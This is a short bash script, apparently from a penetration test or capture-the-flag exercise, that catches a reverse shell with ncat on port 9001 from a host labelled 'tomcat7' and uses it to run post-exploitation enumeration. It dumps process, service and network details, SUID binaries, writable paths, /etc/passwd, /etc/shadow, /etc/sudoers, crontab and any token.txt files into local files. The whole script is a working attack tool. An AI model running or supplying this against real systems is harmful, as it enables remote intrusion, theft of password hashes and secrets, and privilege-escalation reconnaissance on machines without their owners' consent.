#!/usr/bin/env bash

set -e

function triggerRevshell() {
    bash revshell.sh
}

function listenRevshell() {
    ncat -lp 9001
}

DIR=data
INIT_COMMAND=""

function commandToFile() {
    local command="$1"
    local file="$2"
    mkdir -p $DIR
    echo "$INIT_COMMAND $command" | listenRevshell >"$DIR/$file" &
    triggerRevshell
    wait
}

DIR="tomcat7"
commandToFile "ps auxw" processes.txt
commandToFile "systemctl --no-pager --full status" services.txt
commandToFile "ip a ; ip n" network.txt
commandToFile "find / -writable -type d -ls" writeableDirs.txt
commandToFile "find / -type f -perm -04000 -ls" suid.txt
commandToFile "cat /etc/passwd ; cat /etc/group" users.txt
commandToFile "whoami ; hostname ; uname -a" host.txt
commandToFile "cat /etc/shadow" "shadow"
commandToFile "cat /etc/sudoers" "sudoers"
commandToFile "cat /etc/crontab" "crontab"
commandToFile "find / -type f -name token.txt | xargs -n1 cat" "tokens.txt"
commandToFile "find / -writable -type f -ls" writeableFiles.txt
